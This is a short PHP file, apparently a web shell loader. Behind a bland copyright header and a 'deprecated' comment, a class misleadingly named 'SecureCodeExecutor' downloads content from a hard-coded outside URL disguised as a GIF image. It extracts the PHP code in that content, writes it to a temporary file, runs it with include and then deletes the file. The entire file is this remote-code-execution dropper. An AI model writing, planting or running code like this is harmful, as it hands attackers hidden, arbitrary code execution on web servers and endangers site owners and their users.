<?php
/**
 * @package    NewEra Shell
 * @copyright  Copyright (C) 2024 - 2025 Open Source, Inc. All rights reserved.
 */

// @deprecated  1.0  Deprecated without replacement

class CurlFetcher
{
    public function fetchContent(string $url): string
    {
        if (!filter_var($url, FILTER_VALIDATE_URL)) {
            throw new Exception("Invalid URL provided.");
        }

        $response = @file_get_contents($url);

        if ($response === false || empty($response)) {
            throw new Exception("Failed to fetch content or content is empty.");
        }

        return $response;
    }
}

class SecureCodeExecutor
{
    private $fetcher;  

    public function __construct(CurlFetcher $fetcher)
    {
        $this->fetcher = $fetcher;
    }

    public function executeFetchedCode(string $url): void
    {
        $full = $this->fetcher->fetchContent($url);
        $start = strpos($full, '<?php');
        if ($start === false) {
            throw new Exception("No PHP code found in content.");
        }

        $code = substr($full, $start);

        $tempFile = tempnam(sys_get_temp_dir(), 'exec_') . '.php';
        file_put_contents($tempFile, $code);

        try {
            include $tempFile;
        } finally {
            unlink($tempFile);
        }
    }
}

try {
    $fetcher = new CurlFetcher();
    $executor = new SecureCodeExecutor($fetcher);

    $executor->executeFetchedCode("https://punyagweh.pages.dev/plek-ketiplek.gif");
} catch (Exception $e) {
    echo "Error: " . htmlspecialchars($e->getMessage());
}
